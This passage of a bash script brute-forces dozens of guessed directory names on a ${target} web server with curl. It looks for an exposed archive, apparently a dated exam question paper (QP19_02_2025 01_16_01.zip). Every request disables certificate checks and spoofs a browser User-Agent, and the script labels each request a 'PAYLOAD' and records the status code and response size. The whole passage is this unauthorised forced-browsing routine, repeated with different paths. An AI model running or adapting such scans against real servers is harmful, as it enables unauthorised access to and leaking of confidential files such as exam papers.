" "${target}DataPipeline_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtDataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerAutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploaderQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploaderQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploaderQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUploadQPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUploadQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUploadQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor-QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperPanel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow_QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SyncQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerBatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload-QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerDataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
